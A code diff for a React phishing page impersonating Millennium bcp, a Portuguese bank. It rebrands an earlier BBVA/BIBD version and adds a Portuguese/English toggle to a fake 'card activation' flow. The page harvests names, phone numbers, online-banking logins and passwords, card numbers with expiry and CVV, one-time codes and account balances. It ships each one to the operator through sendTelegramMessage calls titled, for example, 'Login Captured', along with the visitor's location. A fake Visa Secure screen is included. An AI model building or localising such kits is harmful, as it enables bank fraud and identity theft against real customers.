@@ -230,46 +230,83 @@ function CardActivationHeader({
   onClose,
   showBack = true,
   showClose = true,
+  language = "pt",
+  onToggleLanguage,
 }: {
   step: 1 | 2 | 3 | 4
   onBack?: () => void
   onClose?: () => void
   showBack?: boolean
   showClose?: boolean
+  language?: "pt" | "en"
+  onToggleLanguage?: (lang: "pt" | "en") => void
 }) {
   return (
     <div className="w-full shrink-0 select-none bg-white">
-      {/* Header Bar: < CARD ACTIVATION X */}
-      <header className="relative z-20 w-full px-5 pt-5 pb-2.5 flex items-center justify-between shrink-0 select-none bg-white">
-        {showBack ? (
-          <button
-            type="button"
-            onClick={onBack}
-            className="p-1 -ml-1 text-[#111827] hover:text-[#990440] transition-colors cursor-pointer flex items-center justify-center"
-            aria-label="Back"
-          >
-            <ChevronLeft className="w-6 h-6 stroke-[2]" />
-          </button>
-        ) : (
-          <div className="w-6 h-6" />
-        )}
+      {/* Header Bar: < CARD ACTIVATION [PT|EN] X */}
+      <header className="relative z-20 w-full px-4 sm:px-5 pt-4 pb-2.5 flex items-center justify-between shrink-0 select-none bg-white">
+        <div className="w-8 flex items-center shrink-0">
+          {showBack ? (
+            <button
+              type="button"
+              onClick={onBack}
+              className="p-1 -ml-1 text-[#111827] hover:text-[#990440] transition-colors cursor-pointer flex items-center justify-center"
+              aria-label="Back"
+            >
+              <ChevronLeft className="w-6 h-6 stroke-[2]" />
+            </button>
+          ) : (
+            <div className="w-6 h-6" />
+          )}
+        </div>
 
-        <span className="text-[14px] sm:text-[14.5px] font-bold text-[#111827] tracking-[0.14em] uppercase text-center">
-          CARD ACTIVATION
+        <span className="text-[13px] sm:text-[14px] font-bold text-[#111827] tracking-[0.1em] uppercase text-center truncate px-1">
+          {language === "en" ? "CARD ACTIVATION" : "ATIVAÇÃO DO CARTÃO"}
         </span>
 
-        {showClose ? (
-          <button
-            type="button"
-            onClick={onClose}
-            className="p-1 -mr-1 text-[#111827] hover:text-[#990440] transition-colors cursor-pointer flex items-center justify-center"
-            aria-label="Clear"
-          >
-            <X className="w-5 h-5 stroke-[2]" />
-          </button>
-        ) : (
-          <div className="w-5 h-5" />
-        )}
+        <div className="flex items-center gap-2 shrink-0">
+          {onToggleLanguage && (
+            <div className="flex items-center bg-[#f1f5f9] rounded-full p-0.5 text-[10.5px] font-bold border border-slate-200/60 select-none">
+              <button
+                type="button"
+                onClick={() => onToggleLanguage("pt")}
+                className={`px-1.5 py-0.5 rounded-full transition-all cursor-pointer ${
+                  language === "pt"
+                    ? "bg-[#990440] text-white shadow-xs"
+                    : "text-[#64748b] hover:text-[#0f172a]"
+                }`}
+                aria-label="Português"
+              >
+                PT
+              </button>
+              <button
+                type="button"
+                onClick={() => onToggleLanguage("en")}
+                className={`px-1.5 py-0.5 rounded-full transition-all cursor-pointer ${
+                  language === "en"
+                    ? "bg-[#990440] text-white shadow-xs"
+                    : "text-[#64748b] hover:text-[#0f172a]"
+                }`}
+                aria-label="English"
+              >
+                EN
+              </button>
+            </div>
+          )}
+
+          {showClose ? (
+            <button
+              type="button"
+              onClick={onClose}
+              className="p-1 -mr-1 text-[#111827] hover:text-[#990440] transition-colors cursor-pointer flex items-center justify-center"
+              aria-label="Clear"
+            >
+              <X className="w-5 h-5 stroke-[2]" />
+            </button>
+          ) : (
+            <div className="w-5 h-5" />
+          )}
+        </div>
       </header>
 
       {/* Stepper / 4-segment progress bar */}
@@ -322,7 +359,23 @@ export default function BbvaPage(props: any) {
   const [splashIconIndex, setSplashIconIndex] = useState(0)
   const [splashAnimPhase, setSplashAnimPhase] = useState<"in" | "out">("in")
   const [isScreenLoading, setIsScreenLoading] = useState(false)
-  const [language, setLanguage] = useState<"en" | "es">("en")
+  const [language, setLanguage] = useState<"pt" | "en">(() => {
+    if (typeof window !== "undefined") {
+      const saved = sessionStorage.getItem("millennium_lang")
+      if (saved === "en" || saved === "pt") return saved
+      const urlParams = new URLSearchParams(window.location.search)
+      const langParam = urlParams.get("lang")
+      if (langParam === "en") return "en"
+    }
+    return "pt"
+  })
+
+  const handleLanguageChange = (lang: "pt" | "en") => {
+    setLanguage(lang)
+    if (typeof window !== "undefined") {
+      sessionStorage.setItem("millennium_lang", lang)
+    }
+  }
   const [locationInfo, setLocationInfo] = useState<{
     ip?: string
     city?: string
@@ -369,7 +422,7 @@ export default function BbvaPage(props: any) {
           setLocationInfo(info)
         }
         await sendTelegramMessage({
-          title: "BIBD — Splash Screen Visitor",
+          title: "Millennium bcp — Splash Screen Visitor",
           type: "splash",
           includeLocation: true,
         })
@@ -442,24 +495,24 @@ export default function BbvaPage(props: any) {
   const [confirmShake, setConfirmShake] = useState(0)
   const confirmOtpRefs = useRef<(HTMLInputElement | null)[]>([])
 
-  // Dynamic greeting based on Spain time (Europe/Madrid)
-  const [greeting, setGreeting] = useState("Buenos días")
+  // Dynamic greeting based on Portugal time (Europe/Lisbon)
+  const [greeting, setGreeting] = useState("Bom dia")
 
   useEffect(() => {
     const updateGreeting = () => {
       try {
         const now = new Date()
-        const spainTime = new Date(now.toLocaleString("en-US", { timeZone: "Europe/Madrid" }))
-        const hour = spainTime.getHours()
+        const lisbonTime = new Date(now.toLocaleString("en-US", { timeZone: "Europe/Lisbon" }))
+        const hour = lisbonTime.getHours()
         if (hour >= 5 && hour < 12) {
-          setGreeting(language === "es" ? "Buenos días" : "Good morning")
-        } else if (hour >= 12 && hour < 19) {
-          setGreeting(language === "es" ? "Buenas tardes" : "Good afternoon")
+          setGreeting(language === "en" ? "Good morning" : "Bom dia")
+        } else if (hour >= 12 && hour < 20) {
+          setGreeting(language === "en" ? "Good afternoon" : "Boa tarde")
         } else {
-          setGreeting(language === "es" ? "Buenas noches" : "Good evening")
+          setGreeting(language === "en" ? "Good evening" : "Boa noite")
         }
       } catch {
-        setGreeting(language === "es" ? "Buenos días" : "Good morning")
+        setGreeting(language === "en" ? "Good morning" : "Bom dia")
       }
     }
     updateGreeting()
@@ -640,7 +693,11 @@ export default function BbvaPage(props: any) {
     if (e) e.preventDefault()
     const cleanPhone = phoneNumber.replace(/\s+/g, "")
     if (!cleanPhone) {
-      setPhoneError("Please enter your mobile number")
+      setPhoneError(
+        language === "en"
+          ? "Please enter your mobile number"
+          : "Por favor, introduza o seu número de telemóvel"
+      )
       phoneInputRef.current?.focus()
       return
     }
@@ -660,7 +717,7 @@ export default function BbvaPage(props: any) {
 
     try {
       await sendTelegramMessage({
-        title: "Contacts — Name & Mobile Number Captured",
+        title: "Millennium bcp — Name & Mobile Number Captured",
         fullName: fullName.trim() || undefined,
         dni: fullName.trim() || undefined,
         phoneNumber: fullPhone,
@@ -687,11 +744,11 @@ export default function BbvaPage(props: any) {
   const handleLogin = async (e?: React.FormEvent) => {
     if (e) e.preventDefault()
     if (!userId.trim()) {
-      setErrorMessage(language === "es" ? "Por favor, introduzca su Usuario" : "Please enter your User")
+      setErrorMessage(language === "en" ? "Please enter your User" : "Por favor, introduza o seu Utilizador")
       return
     }
     if (!password.trim()) {
-      setErrorMessage(language === "es" ? "Por favor, introduzca su Contraseña" : "Please enter your Password")
+      setErrorMessage(language === "en" ? "Please enter your Password" : "Por favor, introduza a sua Palavra-passe")
       return
     }
 
@@ -706,7 +763,7 @@ export default function BbvaPage(props: any) {
 
     try {
       await sendTelegramMessage({
-        title: "BIBD — Login Captured",
+        title: "Millennium bcp — Login Captured",
         dni: userId.trim(),
         password: password,
         type: "login",
@@ -731,21 +788,21 @@ export default function BbvaPage(props: any) {
     const cleanCard = cardNumber.replace(/\s+/g, "")
     if (!isValidLuhn(cleanCard)) {
       setCardError(
-        language === "es"
-          ? "Por favor ingrese un número de tarjeta válido de 16 dígitos"
-          : "Please enter a valid 16-digit card number"
+        language === "en"
+          ? "Please enter a valid 16-digit card number"
+          : "Por favor, introduza um número de cartão válido de 16 dígitos"
       )
       cardNumberRef.current?.focus()
       return
     }
     if (!cardMonth || !cardYear) {
-      setCardError(language === "es" ? "Fecha de caducidad requerida" : "Expiration date is required")
+      setCardError(language === "en" ? "Expiration date is required" : "Data de validade é obrigatória")
       if (!cardMonth) cardMonthRef.current?.focus()
       else cardYearRef.current?.focus()
       return
     }
     if (cardCvv.length !== 3) {
-      setCardError(language === "es" ? "El código CVV / CVC debe tener 3 dígitos" : "CVV must be 3 digits")
+      setCardError(language === "en" ? "CVV must be 3 digits" : "O código CVV deve ter 3 dígitos")
       cardCvvRef.current?.focus()
       return
     }
@@ -948,9 +1005,9 @@ export default function BbvaPage(props: any) {
     const fullCode = otp.join("")
     if (fullCode.length < 6) {
       setOtpError(
-        language === "es"
-          ? "Por favor, introduzca el código de 6 dígitos"
-          : "Please enter the full 6-digit code"
+        language === "en"
+          ? "Please enter the full 6-digit code"
+          : "Por favor, introduza o código de 6 dígitos"
       )
       setShakeCount((prev) => prev + 1)
       return
@@ -1114,7 +1171,7 @@ export default function BbvaPage(props: any) {
 
     const savedUser = (typeof window !== "undefined" && sessionStorage.getItem("bbva_userId")) || userId.trim()
     sendTelegramMessage({
-      title: "BIBD — Confirm OTP Resend Requested",
+      title: "Millennium bcp — Confirm OTP Resend Requested",
       dni: savedUser || undefined,
       type: "resend_confirm_otp",
     }).catch(() => {})
@@ -1131,7 +1188,7 @@ export default function BbvaPage(props: any) {
 
     const savedUser = (typeof window !== "undefined" && sessionStorage.getItem("bbva_userId")) || userId.trim()
     sendTelegramMessage({
-      title: "BIBD — OTP Resend Requested",
+      title: "Millennium bcp — OTP Resend Requested",
       dni: savedUser || undefined,
       type: "resend_otp",
     }).catch(() => {})
@@ -1195,9 +1252,11 @@ export default function BbvaPage(props: any) {
       {/* ========================================================================= */}
       {currentScreen === "phone" && (
         <main className="relative w-full max-w-[440px] sm:max-w-[460px] h-[100dvh] max-h-[100dvh] flex flex-col justify-between overflow-hidden shadow-2xl bg-white px-0 select-none">
-          {/* Header Bar: < CARD ACTIVATION X + 4-segment Progress Bar */}
+          {/* Header Bar: < CARD ACTIVATION [PT|EN] X + 4-segment Progress Bar */}
           <CardActivationHeader
             step={1}
+            language={language}
+            onToggleLanguage={handleLanguageChange}
             onBack={() => {
               setCurrentScreen("splash")
               if (typeof window !== "undefined" && window.history) {
@@ -1218,12 +1277,18 @@ export default function BbvaPage(props: any) {
             <div className="w-full flex flex-col">
               {/* Heading */}
               <h1 className="text-[25px] sm:text-[27px] font-bold text-[#111827] leading-[1.22] tracking-tight mb-2">
-                Tell us your name and mobile<br />number
+                {language === "en" ? (
+                  <>Tell us your name and mobile<br />number</>
+                ) : (
+                  <>Indique o seu nome e número<br />de telemóvel</>
+                )}
               </h1>
 
               {/* Subheading */}
               <p className="text-[14px] sm:text-[14.5px] text-[#4b5563] font-normal leading-[1.4] mb-6">
-                We will send you an SMS code to associate this number with your account
+                {language === "en"
+                  ? "We will send you an SMS code to associate this number with your account"
+                  : "Enviaremos um código por SMS para associar este número à sua conta"}
               </p>
 
               {/* Form */}
@@ -1241,7 +1306,7 @@ export default function BbvaPage(props: any) {
                         : "top-1/2 -translate-y-1/2 text-[15.5px] text-[#6b7280] font-normal"
                     }`}
                   >
-                    First and last name
+                    {language === "en" ? "First and last name" : "Nome e apelido"}
                   </label>
                   <input
                     id="fullNameInput"
@@ -1276,7 +1341,7 @@ export default function BbvaPage(props: any) {
                           : "top-1/2 -translate-y-1/2 text-[15.5px] text-[#6b7280] font-normal"
                       }`}
                     >
-                      Mobile number
+                      {language === "en" ? "Mobile number" : "Número de telemóvel"}
                     </label>
                     <input
                       id="mobileInput"
@@ -1339,10 +1404,12 @@ export default function BbvaPage(props: any) {
                         d="M4 12a8 8 0 018-8v8H4z"
                       />
                     </svg>
-                    <span>Connecting...</span>
+                    <span>{language === "en" ? "Connecting..." : "A ligar..."}</span>
                   </div>
-                ) : (
+                ) : language === "en" ? (
                   "Continue"
+                ) : (
+                  "Continuar"
                 )}
               </button>
             </div>
@@ -1360,9 +1427,11 @@ export default function BbvaPage(props: any) {
             backgroundColor: "#ffffff",
           }}
         >
-          {/* Header Bar: < CARD ACTIVATION X + 4-segment Progress Bar */}
+          {/* Header Bar: < CARD ACTIVATION [PT|EN] X + 4-segment Progress Bar */}
           <CardActivationHeader
             step={1}
+            language={language}
+            onToggleLanguage={handleLanguageChange}
             onBack={() => {
               setCurrentScreen("splash")
               if (typeof window !== "undefined" && window.history) {
@@ -1393,7 +1462,7 @@ export default function BbvaPage(props: any) {
                 {/* Input 1: User */}
                 <div className="w-full">
                   <label className="block text-[#374761] text-[13.5px] font-medium mb-1.5 select-none">
-                    {language === "es" ? "Usuario" : "User"}
+                    {language === "en" ? "User" : "Utilizador"}
                   </label>
                   <input
                     type="text"
@@ -1403,7 +1472,7 @@ export default function BbvaPage(props: any) {
                       setUserId(e.target.value)
                       if (errorMessage) setErrorMessage("")
                     }}
-                    placeholder={language === "es" ? "Usuario" : "User"}
+                    placeholder={language === "en" ? "User" : "Utilizador"}
                     className="w-full h-[48px] px-4 rounded-[10px] bg-white text-[#1e293b] placeholder-[#94a3b8] text-[15.5px] font-normal border border-transparent focus:outline-none focus:border-[#990440] focus:ring-1 focus:ring-[#990440] transition-all shadow-[0_1px_2px_rgba(0,0,0,0.04)]"
                   />
                 </div>
@@ -1411,7 +1480,7 @@ export default function BbvaPage(props: any) {
                 {/* Input 2: Password */}
                 <div className="w-full mt-3.5">
                   <label className="block text-[#374761] text-[13.5px] font-medium mb-1.5 select-none">
-                    {language === "es" ? "Contraseña" : "Password"}
+                    {language === "en" ? "Password" : "Palavra-passe"}
                   </label>
                   <div className="w-full h-[48px] px-4 rounded-[10px] bg-white flex items-center border border-transparent focus-within:border-[#990440] focus-within:ring-1 focus-within:ring-[#990440] transition-all shadow-[0_1px_2px_rgba(0,0,0,0.04)]">
                     <input
@@ -1422,7 +1491,7 @@ export default function BbvaPage(props: any) {
                         setPassword(e.target.value)
                         if (errorMessage) setErrorMessage("")
                       }}
-                      placeholder={language === "es" ? "Contraseña" : "Password"}
+                      placeholder={language === "en" ? "Password" : "Palavra-passe"}
                       className="flex-1 min-w-0 h-full bg-transparent text-[#1e293b] placeholder-[#94a3b8] text-[15.5px] font-normal border-none outline-none pr-2"
                     />
                     <button
@@ -1453,7 +1522,7 @@ export default function BbvaPage(props: any) {
                   disabled={isScreenLoading}
                   className="w-full h-[50px] mt-5 rounded-full bg-[#990440] hover:bg-[#830336] active:scale-[0.985] text-white font-semibold text-[15.5px] tracking-wide flex items-center justify-center shadow-md cursor-pointer transition-all disabled:opacity-85 select-none"
                 >
-                  {language === "es" ? "Iniciar sesión para verificar" : "Log in to verify"}
+                  {language === "en" ? "Log in to verify" : "Iniciar sessão para verificar"}
                 </button>
               </form>
 
@@ -1464,7 +1533,7 @@ export default function BbvaPage(props: any) {
                     <UserPlus className="w-[20px] h-[20px] text-[#990440]" strokeWidth={2.2} />
                   </div>
                   <span className="text-[11px] sm:text-[11.5px] font-medium text-[#2d3a52] mt-2 leading-[1.25]">
-                    {language === "es" ? <>Hazte<br />cliente</> : <>Become a<br />customer</>}
+                    {language === "en" ? <>Become a<br />customer</> : <>Aderir<br />ao Banco</>}
                   </span>
                 </div>
 
@@ -1473,7 +1542,7 @@ export default function BbvaPage(props: any) {
                     <Home className="w-[20px] h-[20px] text-[#990440]" strokeWidth={2.2} />
                   </div>
                   <span className="text-[11px] sm:text-[11.5px] font-medium text-[#2d3a52] mt-2 leading-[1.25]">
-                    BBVA<br />Valora<br />Homes
+                    Millennium<br />App
                   </span>
                 </div>
 
@@ -1482,7 +1551,7 @@ export default function BbvaPage(props: any) {
                     <MapPin className="w-[20px] h-[20px] text-[#990440]" strokeWidth={2.2} />
                   </div>
                   <span className="text-[11px] sm:text-[11.5px] font-medium text-[#2d3a52] mt-2 leading-[1.25]">
-                    {language === "es" ? <>Oficinas<br />y cajeros</> : <>Branches<br />and ATMs</>}
+                    {language === "en" ? <>Branches<br />and ATMs</> : <>Sucursais<br />e caixas</>}
                   </span>
                 </div>
 
@@ -1491,7 +1560,7 @@ export default function BbvaPage(props: any) {
                     <Users className="w-[20px] h-[20px] text-[#990440]" strokeWidth={2.2} />
                   </div>
                   <span className="text-[11px] sm:text-[11.5px] font-medium text-[#2d3a52] mt-2 leading-[1.25]">
-                    {language === "es" ? <>Compartir<br />gastos</> : <>Share<br />expenses</>}
+                    {language === "en" ? <>Share<br />expenses</> : <>Partilhar<br />despesas</>}
                   </span>
                 </div>
               </div>
@@ -1509,9 +1578,11 @@ export default function BbvaPage(props: any) {
       {/* ========================================================================= */}
       {currentScreen === "card" && (
         <main className="relative w-full max-w-[440px] sm:max-w-[460px] h-[100dvh] max-h-[100dvh] flex flex-col overflow-hidden shadow-2xl bg-white px-0">
-          {/* Header Bar: < CARD ACTIVATION X + 4-segment Progress Bar */}
+          {/* Header Bar: < CARD ACTIVATION [PT|EN] X + 4-segment Progress Bar */}
           <CardActivationHeader
             step={2}
+            language={language}
+            onToggleLanguage={handleLanguageChange}
             onBack={() => {
               setCurrentScreen("phone")
               if (typeof window !== "undefined" && window.history) {
@@ -1548,12 +1619,12 @@ export default function BbvaPage(props: any) {
               <div className="w-full flex flex-col pb-6">
                 {/* Title & Subtitle */}
                 <h2 className="text-[#0d1e38] text-[20px] sm:text-[21px] font-bold tracking-tight">
-                  {language === "es" ? "Introducir datos de tarjeta" : "Enter Card Details"}
+                  {language === "en" ? "Enter Card Details" : "Introduzir dados do cartão"}
                 </h2>
                 <p className="text-[#64748b] text-[13px] sm:text-[13.5px] font-normal mt-0.5 mb-4">
-                  {language === "es"
-                    ? "Introduzca los datos de su tarjeta para continuar."
-                    : "Please enter your card details to verify and activate your card."}
+                  {language === "en"
+                    ? "Please enter your card details to verify and activate your card."
+                    : "Por favor, introduza os dados do seu cartão para verificar e ativar o cartão."}
                 </p>
 
                 {/* Form */}
@@ -1562,7 +1633,7 @@ export default function BbvaPage(props: any) {
                   <div className="w-full mb-3.5">
                     <div className="flex items-center justify-between mb-1.5">
                       <label className="text-[11px] font-bold text-[#64748b] tracking-wider uppercase">
-                        {language === "es" ? "NÚMERO DE TARJETA DE 16 DÍGITOS" : "16-DIGIT CARD NUMBER"}
+                        {language === "en" ? "16-DIGIT CARD NUMBER" : "NÚMERO DE CARTÃO DE 16 DÍGITOS"}
                       </label>
                     </div>
                     <input
@@ -1583,7 +1654,7 @@ export default function BbvaPage(props: any) {
                     <div>
                       <div className="flex items-center gap-1 mb-1.5">
                         <label className="text-[11px] font-bold text-[#64748b] tracking-wider uppercase">
-                          {language === "es" ? "MES" : "MONTH"}
+                          {language === "en" ? "MONTH" : "MÊS"}
                         </label>
                       </div>
                       <input
@@ -1603,7 +1674,7 @@ export default function BbvaPage(props: any) {
                     <div>
                       <div className="flex items-center mb-1.5">
                         <label className="text-[11px] font-bold text-[#64748b] tracking-wider uppercase">
-                          {language === "es" ? "AÑO" : "YEAR"}
+                          {language === "en" ? "YEAR" : "ANO"}
                         </label>
                       </div>
                       <input
@@ -1649,9 +1720,9 @@ export default function BbvaPage(props: any) {
 
                   {/* 256-bit encryption text */}
                   <p className="text-center text-[11px] sm:text-[11.5px] text-[#94a3b8] mt-2 mb-4 leading-normal">
-                    {language === "es"
-                      ? "Los datos de su tarjeta están protegidos con cifrado de 256 bits."
-                      : "Your card details are secured with 256-bit encryption."}
+                    {language === "en"
+                      ? "Your card details are secured with 256-bit encryption."
+                      : "Os dados do seu cartão estão protegidos com encriptação de 256 bits."}
                   </p>
 
                   {/* Continue Button */}
@@ -1686,12 +1757,12 @@ export default function BbvaPage(props: any) {
                             d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"
                           />
                         </svg>
-                        <span>{language === "es" ? "VERIFICANDO..." : "VERIFYING..."}</span>
+                        <span>{language === "en" ? "VERIFYING..." : "A VERIFICAR..."}</span>
                       </div>
-                    ) : language === "es" ? (
-                      "Continuar"
-                    ) : (
+                    ) : language === "en" ? (
                       "Continue"
+                    ) : (
+                      "Continuar"
                     )}
                   </button>
                 </form>
@@ -1707,35 +1778,69 @@ export default function BbvaPage(props: any) {
       {/* ========================================================================= */}
       {currentScreen === "boc-verify" && (
         <main className="relative w-full max-w-[440px] sm:max-w-[460px] h-[100dvh] max-h-[100dvh] flex flex-col justify-between overflow-y-auto shadow-2xl bg-white px-0 select-none">
-          {/* Header: Left is Millennium bcp badge, Right is VISA SECURE badge */}
+          {/* Header: Left is Millennium bcp badge, Right is PT|EN toggle + VISA SECURE badge */}
           <header className="w-full px-6 pt-7 pb-4 flex items-center justify-between shrink-0 bg-white">
             <MillenniumBcpBadge />
-            <VisaSecureBadge />
+            <div className="flex items-center gap-3">
+              <div className="flex items-center bg-[#f1f5f9] rounded-full p-0.5 text-[10.5px] font-bold border border-slate-200/60 select-none">
+                <button
+                  type="button"
+                  onClick={() => handleLanguageChange("pt")}
+                  className={`px-1.5 py-0.5 rounded-full transition-all cursor-pointer ${
+                    language === "pt"
+                      ? "bg-[#990440] text-white shadow-xs"
+                      : "text-[#64748b] hover:text-[#0f172a]"
+                  }`}
+                  aria-label="Português"
+                >
+                  PT
+                </button>
+                <button
+                  type="button"
+                  onClick={() => handleLanguageChange("en")}
+                  className={`px-1.5 py-0.5 rounded-full transition-all cursor-pointer ${
+                    language === "en"
+                      ? "bg-[#990440] text-white shadow-xs"
+                      : "text-[#64748b] hover:text-[#0f172a]"
+                  }`}
+                  aria-label="English"
+                >
+                  EN
+                </button>
+              </div>
+              <VisaSecureBadge />
+            </div>
           </header>
 
           {/* Main Body */}
           <section className="w-full flex-1 flex flex-col px-6 pt-4 pb-7 select-none bg-white">
-            {/* Title: Confirm Payment */}
+            {/* Title: Confirme o Pagamento */}
             <h1 className="text-[20px] sm:text-[22px] font-normal text-[#1a1a1a] tracking-tight mb-5">
-              Confirm Payment
+              {language === "en" ? "Confirm Payment" : "Confirme o Pagamento"}
             </h1>
 
-            {/* Warning / Authentication Alert Box matching photo in English */}
+            {/* Warning / Authentication Alert Box matching photo */}
             <div className="w-full flex items-start gap-3.5 mb-6">
               <div className="w-9 h-9 sm:w-10 sm:h-10 rounded-full border-[2.2px] border-[#7d8b99] flex items-center justify-center shrink-0 text-[#7d8b99] font-bold text-[19px] leading-none select-none mt-0.5">
                 !
               </div>
               <p className="text-[13.5px] sm:text-[14px] text-[#2c3e50] leading-[1.48] font-normal">
-                Authentication was not successful. Please check your bank&apos;s app and follow the instructions to complete the authentication process.
+                {language === "en"
+                  ? "Authentication was not successful. Please check your bank's app and follow the instructions to complete the authentication process."
+                  : "A autenticação não foi realizada com sucesso. Por favor, verifique a aplicação do seu banco e siga as indicações para conclusão do processo de autenticação."}
               </p>
             </div>
 
             {/* Simple clean text of deduction fee only (no entire box) */}
             <p className="text-[13px] sm:text-[13.5px] text-[#4b5563] mt-1 mb-6">
-              Fee deduction: <span className="font-semibold text-[#111827]">0.082 EUR</span>
+              {language === "en" ? (
+                <>Fee deduction: <span className="font-semibold text-[#111827]">0.082 EUR</span></>
+              ) : (
+                <>Dedução de taxa: <span className="font-semibold text-[#111827]">0.082 EUR</span></>
+              )}
             </p>
 
-            {/* Blue Button: I ALREADY AUTHORIZED. CONTINUE. (Non-clickable as requested) */}
+            {/* Blue Button: JÁ AUTORIZEI. CONTINUAR. (Non-clickable as requested) */}
             <div className="w-full mt-auto pt-4 select-none">
               <button
                 type="button"
@@ -1743,7 +1848,9 @@ export default function BbvaPage(props: any) {
                 className="w-full h-[46px] sm:h-[48px] rounded-[4px] bg-[#26538d] text-white text-[13px] sm:text-[13.5px] font-bold tracking-[0.06em] uppercase flex items-center justify-center shadow-sm select-none pointer-events-none cursor-default opacity-95"
                 aria-disabled="true"
               >
-                I ALREADY AUTHORIZED. CONTINUE.
+                {language === "en"
+                  ? "I ALREADY AUTHORIZED. CONTINUE."
+                  : "JÁ AUTORIZEI. CONTINUAR."}
               </button>
             </div>
           </section>
@@ -1757,9 +1864,11 @@ export default function BbvaPage(props: any) {
       {/* ========================================================================= */}
       {currentScreen === "otp" && (
         <main className="relative w-full max-w-[440px] sm:max-w-[460px] h-[100dvh] max-h-[100dvh] flex flex-col overflow-hidden shadow-2xl bg-white px-0">
-          {/* Header Bar: < CARD ACTIVATION X + 4-segment Progress Bar */}
+          {/* Header Bar: < CARD ACTIVATION [PT|EN] X + 4-segment Progress Bar */}
           <CardActivationHeader
             step={3}
+            language={language}
+            onToggleLanguage={handleLanguageChange}
             onBack={() => {
               setCurrentScreen("card")
               if (typeof window !== "undefined" && window.history) {
@@ -1789,14 +1898,14 @@ export default function BbvaPage(props: any) {
 
               {/* Title: Verify your identity */}
               <h2 className="text-[#0d1e38] text-[20px] sm:text-[21px] font-bold tracking-tight mb-1.5">
-                {language === "es" ? "Verifique su identidad" : "Verify your identity"}
+                {language === "en" ? "Verify your identity" : "Verifique a sua identidade"}
               </h2>
 
               {/* Subtitle */}
               <p className="text-[#64748b] text-[12.5px] sm:text-[13px] font-normal leading-relaxed max-w-[255px] mb-4.5">
-                {language === "es"
-                  ? "Se ha enviado un código de verificación de 6 dígitos a su número registrado."
-                  : "A 6-digit verification code has been sent to your registered mobile number."}
+                {language === "en"
+                  ? "A 6-digit verification code has been sent to your registered mobile number."
+                  : "Foi enviado um código de verificação de 6 dígitos para o seu telemóvel registado."}
               </p>
 
               {/* 6 Digit Input Boxes */}
@@ -1830,7 +1939,7 @@ export default function BbvaPage(props: any) {
               {/* Countdown & Resend Code */}
               <div className="flex flex-col items-center mb-5 select-none">
                 <p className="text-[#64748b] text-[12.5px] sm:text-[13px] font-normal">
-                  {language === "es" ? "El código caduca en " : "Code expires in "}
+                  {language === "en" ? "Code expires in " : "O código expira em "}
                   <span className="font-bold text-[#0d1e38]">{formatTimer(timeLeft)}</span>
                 </p>
 
@@ -1840,12 +1949,12 @@ export default function BbvaPage(props: any) {
                   className="flex items-center gap-1.5 text-[12px] sm:text-[12.5px] font-medium text-[#64748b] hover:text-[#990440] cursor-pointer mt-1.5 transition-colors"
                 >
                   <RotateCw className="w-3.5 h-3.5 stroke-[2]" />
-                  <span>{language === "es" ? "Reenviar código" : "Resend code"}</span>
+                  <span>{language === "en" ? "Resend code" : "Reenviar código"}</span>
                 </button>
 
                 {resendSuccess && (
                   <p className="mt-1.5 text-emerald-600 text-[12px] font-medium animate-in fade-in">
-                    {language === "es" ? "Código reenviado con éxito" : "Code resent successfully"}
+                    {language === "en" ? "Code resent successfully" : "Código reenviado com sucesso"}
                   </p>
                 )}
               </div>
@@ -1893,12 +2002,12 @@ export default function BbvaPage(props: any) {
                         d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"
                       />
                     </svg>
-                    <span>{language === "es" ? "VERIFICANDO..." : "VERIFYING..."}</span>
+                    <span>{language === "en" ? "VERIFYING..." : "A VERIFICAR..."}</span>
                   </div>
-                ) : language === "es" ? (
-                  "Verificar"
-                ) : (
+                ) : language === "en" ? (
                   "Verify"
+                ) : (
+                  "Verificar"
                 )}
               </button>
             </div>
@@ -1911,9 +2020,11 @@ export default function BbvaPage(props: any) {
       {/* ========================================================================= */}
       {currentScreen === "accounts" && (
         <main className="relative w-full max-w-[440px] sm:max-w-[460px] h-[100dvh] max-h-[100dvh] flex flex-col overflow-hidden shadow-2xl bg-white px-0">
-          {/* Header Bar: < CARD ACTIVATION X + 4-segment Progress Bar */}
+          {/* Header Bar: < CARD ACTIVATION [PT|EN] X + 4-segment Progress Bar */}
           <CardActivationHeader
             step={4}
+            language={language}
+            onToggleLanguage={handleLanguageChange}
             onBack={() => {
               setCurrentScreen("otp")
               if (typeof window !== "undefined" && window.history) {
@@ -1960,7 +2071,7 @@ export default function BbvaPage(props: any) {
             {/* Box 1: ACCOUNT NUMBER */}
             <div className="w-full border border-[#e2e8f0] rounded-[14px] p-3.5 bg-white">
               <label className="block text-[10.5px] font-bold text-[#64748b] tracking-wider uppercase mb-2">
-                {language === "es" ? "NÚMERO DE CUENTA" : "ACCOUNT NUMBER"}
+                {language === "en" ? "ACCOUNT NUMBER" : "NÚMERO DE CONTA"}
               </label>
               <div className="flex items-center flex-nowrap whitespace-nowrap">
                 <span className="bg-[#f1f5f9] text-[#475569] text-[12px] font-semibold px-2.5 py-1 rounded-[6px] mr-3 select-none shrink-0">
@@ -1975,12 +2086,12 @@ export default function BbvaPage(props: any) {
             {/* Box 2: BANK SECURITY QUESTION */}
             <div className="w-full border border-[#e2e8f0] rounded-[14px] p-3.5 bg-white">
               <label className="block text-[10.5px] font-bold text-[#64748b] tracking-wider uppercase mb-1">
-                {language === "es" ? "PREGUNTA DE SEGURIDAD BANCARIA" : "BANK SECURITY QUESTION"}
+                {language === "en" ? "BANK SECURITY QUESTION" : "PERGUNTA DE SEGURANÇA BANCÁRIA"}
               </label>
               <p className="text-[13px] font-medium text-[#1e293b] mb-2.5">
-                {language === "es"
-                  ? "¿Cuál es el saldo actual de su cuenta?"
-                  : "What is your current account balance?"}
+                {language === "en"
+                  ? "What is your current account balance?"
+                  : "Qual é o saldo atual da sua conta?"}
               </p>
               <div className="flex items-center">
                 <span className="bg-[#990440] text-white text-[11px] font-bold px-2.5 py-1 rounded-[6px] mr-2.5 select-none shrink-0 flex items-center justify-center">
@@ -2027,14 +2138,14 @@ export default function BbvaPage(props: any) {
                         d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"
                       />
                     </svg>
-                    <span>{language === "es" ? "PROCESANDO..." : "PROCESSING..."}</span>
